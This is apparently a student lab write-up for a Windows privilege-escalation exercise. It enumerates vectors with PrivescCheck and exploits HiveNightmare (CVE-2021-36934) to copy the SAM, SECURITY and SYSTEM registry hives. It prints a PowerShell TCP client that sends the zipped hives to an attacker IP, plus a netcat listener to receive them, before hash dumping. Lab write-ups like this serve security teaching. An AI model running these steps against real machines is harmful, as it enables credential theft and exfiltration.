## Windows PrivEsc, task 1:

---

### Our objective is given in the /windows_privsec/tasks/1-task.md

---

## PrivEsc Vector enumeration

> First, let's download the privcheck powerhsell script, and move it to pwd: ([Download Link](https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1))

> Run an extended privcheck

```powershell
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
```


![image](https://github.com/Velatryx/holbertonschool-cyber_security/blob/main/privilege_escalation_security_win/windows_privsec/Images/Screenshot%20From%202026-07-18%2013-14-23.png)

> The extended check will save the output as .txt and .html. You can download the html and open it in the new tab to analyze it further [here](1-task.html)

![image](https://github.com/Velatryx/holbertonschool-cyber_security/blob/main/privilege_escalation_security_win/windows_privsec/Images/Screenshot%20From%202026-07-18%2013-15-30.png)

---

## Exploitation (CVE-2021-36934 - HiveNightmare).

> Check https://www.exploit-db.com/docs/50245 for detailed exploitation & mitigation steps.

Description: HiveNightmare aka SeriouSAM (CVE-2021-36934) is a local elevation of privilege vulnerability that exists due to
excessively permissive Access Control Lists (ACLs) on various system files, including the Safety Accounts Manager
(SAM) database. If an attacker successfully exploits this vulnerability in a system, it allows them to access registry
files stored in folders such as SAM, SECURITY, SYSTEM, DEFAULT, and SOFTWARE

```
Base Score: 7.8
Vector: CVSS:3.1/AV: L/AC: L/PR: L/UI: N/S: U/C: H/I: H/A: H
Impact Score: 5.9
Exploitability Score: 1.8
Severity: HIGH
```

> Let's download the .exe exploit [here](https://github.com/GossiTheDog/HiveNightmare) and run it. As we can see, it wrote some files on the desktop, which we should switch to Kali Linux, and use impacket-secretsdump.py to extract hashes.

![image](https://github.com/Velatryx/holbertonschool-cyber_security/blob/main/privilege_escalation_security_win/windows_privsec/Images/Screenshot%20From%202026-07-18%2013-28-30.png)

---

## Dumping hashes with secretsdump:

> First, let's use powershell to zip the files and then send the .zip file to Kali:

```shell
Compress-Archive -Path "C:\Users\Sammy\Desktop\SYSTEM-2025-02-11", "C:\Users\Sammy\Desktop\SECURITY-2025-02-11", "C:\Users\Sammy\Desktop\SAM-2025-01-15" -DestinationPath "C:\Users\Sammy\Desktop\hives.zip"
```

> Then send it.

```powershell
[System.IO.File]::WriteAllBytes("hives.zip", (Get-Content "C:\Users\Sammy\Desktop\hives.zip" -Encoding Byte))
$client = New-Object System.Net.Sockets.TcpClient("172.16.220.130", 80)
$stream = $client.GetStream()
$bytes = [System.IO.File]::ReadAllBytes("C:\Users\Sammy\Desktop\hives.zip")
$stream.Write($bytes, 0, $bytes.Length)
$stream.Close(); $client.Close()
```

![images](https://github.com/Velatryx/holbertonschool-cyber_security/blob/main/privilege_escalation_security_win/windows_privsec/Images/Screenshot%20From%202026-07-18%2014-08-25.png)

> Kali Linux:

```shell
nc -lvnp 80 > hives.zip
```

![images](https://github.com/Velatryx/holbertonschool-cyber_security/blob/main/privilege_escalation_security_win/windows_privsec/Images/Screenshot%20From%202026-07-18%2014-11-39.png)
